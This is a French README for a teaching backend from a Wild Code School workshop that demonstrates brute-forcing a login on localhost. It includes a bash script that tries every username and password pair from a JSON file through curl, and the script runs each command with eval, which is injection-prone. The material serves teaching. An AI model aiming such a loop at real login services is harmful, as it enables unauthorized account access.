<h1 align="center">Welcome to backend for brute force 👋</h1>
<p>
  <img alt="Version" src="https://img.shields.io/badge/version-1.0.0-blue.svg?cacheSeconds=2592000" />
  <a href="#" target="_blank">
    <img alt="License: ISC" src="https://img.shields.io/badge/License-ISC-yellow.svg" />
  </a>
  <a href="https://twitter.com/Gorski_anthony" target="_blank">
    <img alt="Twitter: Gorski_anthony" src="https://img.shields.io/twitter/follow/Gorski_anthony.svg?style=social" />
  </a>
</p>

> Backend pour tester le hack d'authentification pour un atelier de la wild code school

Lien du repo github pour tester le hack : [GorskiAnthony/WCS_BruteForce](https://github.com/GorskiAnthony/WCS_BruteForce)

## Install

```sh
npm install
```

Ne pas oublier de créer un fichier .env à la racine du projet avec les variables suivantes :

```sh
API_URL=http://localhost:3000/api
```

## Usage

```sh
# Charge les comptes dans le fichier combinations.json
node loadAccount.js
```

```sh
# Lancement du serveur de hack
npm run hack
```

## cURL

Voilà le script cURL pour tester le hack :

```sh
curl -X POST http://localhost:3000/api/login -H "Content-Type: application/json" -d '{"username":"admin", "password":"password"}'
```

Le truc, c'est qu'il faut tester toutes les combinaisons possibles. Pour cela, il faut utiliser un script qui va tester toutes les combinaisons possibles.

## Script

```sh
#!/bin/bash

url="http://localhost:3000/api/login"
credentials_file="combinations.json"

usernames=$(jq -r '.usernames[]' "$credentials_file")
passwords=$(jq -r '.passwords[]' "$credentials_file")

# Générer les commandes curl pour chaque combinaison
for username in $usernames; do
  for password in $passwords; do
    command="curl -X POST $url -H \"Content-Type: application/json\" -d '{\"username\":\"$username\", \"password\":\"$password\"}'"
    echo "Commande: $command"
    response=$(eval $command)
    echo "Réponse: $response"
    echo "---"
  done
done
```

Je l'ai mis dans un fichier brute-force.sh, mais il faut le rendre exécutable pour pouvoir l'utiliser.

Pour pouvoir utiliser le script, il faut le rendre exécutable :

```sh
chmod +x brute-force.sh
```

Et ensuite, il suffit de lancer le script :

```sh
./brute-force.sh
```

## Author

👤 **Anthony Gorski**

-   Twitter: [@Gorski_Anthony](https://twitter.com/Gorski_Anthony)
-   GitHub: [@GorskiAnthony](https://github.com/GorskiAnthony)

## Show your support

Give a ⭐️ if this project helped you!

---

👋 Qui suis-je ?
Je suis **Anthony Gorski**, développeur web et formateur à la [Wild Code School](https://www.wildcodeschool.com/fr-FR).
